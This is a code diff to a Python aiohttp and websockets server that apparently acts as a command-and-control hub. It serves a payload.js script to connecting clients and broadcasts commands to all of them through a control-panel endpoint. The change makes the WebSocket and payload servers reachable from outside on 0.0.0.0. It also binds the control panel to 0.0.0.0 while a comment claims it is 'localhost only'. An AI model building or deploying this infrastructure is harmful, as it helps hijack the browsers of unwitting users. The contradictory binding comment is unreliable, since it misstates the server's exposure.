@@ -33,7 +33,7 @@ async def send_command(request):
     return web.Response(text="Command sent to all clients")
 
 async def serve_payload(request):
-    with open("./static/payload.js", 'r', encoding='UTF-8') as f:
+    with open("./static_payload/payload.js", 'r', encoding='UTF-8') as f:
         content = f.read()
 
     return web.Response(text=content, headers={
@@ -43,26 +43,46 @@ async def serve_payload(request):
 
 if __name__ == "__main__":
     loop = asyncio.get_event_loop()
-
-    # WebSocket server
-    ws_server = websockets.serve(hello, "localhost", 8765)
+    
+    ws_ip = "0.0.0.0"
+    ws_port = 8765
+    
+    control_ip = "0.0.0.0"
+    control_port = 8080
+    
+    payload_ip = "0.0.0.0"
+    payload_port = 8081
+    
+    # WebSocket server accessible externally
+    ws_server = websockets.serve(hello, ws_ip, ws_port)
     loop.run_until_complete(ws_server)
 
-    # HTTP server for control panel
-    app = web.Application()
-    app.router.add_post('/send_command', send_command)
-    app.router.add_get('/payload.js', serve_payload)
+    # HTTP server for control panel, localhost only
+    control_app = web.Application()
+    control_app.router.add_post('/send_command', send_command)
 
     # Serve static HTML for the control panel
-    app.router.add_static('/', './static')
+    control_app.router.add_static('/', './static_control')
 
-    runner = web.AppRunner(app)
-    loop.run_until_complete(runner.setup())
-    site = web.TCPSite(runner, "localhost", 8080)
-    loop.run_until_complete(site.start())
+    runner_control = web.AppRunner(control_app)
+    loop.run_until_complete(runner_control.setup())
+    site_control = web.TCPSite(runner_control, control_ip, control_port)  # Only accessible via localhost
+    loop.run_until_complete(site_control.start())
 
-    print("WebSocket server started at ws://localhost:8765/")
-    print("Control panel available at http://localhost:8080/control_panel.html")
+    # HTTP server for payload.js, externally accessible
+    payload_app = web.Application()
+    payload_app.router.add_get('/payload.js', serve_payload)
+
+    # Serve static HTML for the payload
+    payload_app.router.add_static('/', './static_payload')
+
+    runner_payload = web.AppRunner(payload_app)
+    loop.run_until_complete(runner_payload.setup())
+    site_payload = web.TCPSite(runner_payload, payload_ip, payload_port)  # Externally accessible
+    loop.run_until_complete(site_payload.start())
+
+    print(f"WebSocket server started at ws://{ws_ip}:{ws_port}/")
+    print(f"Control panel available at http://{control_ip}:{control_port}/control_panel.html")
+    print(f"Payload available at http://{payload_ip}:{payload_port}/payload.js")
 
     loop.run_forever()
-    
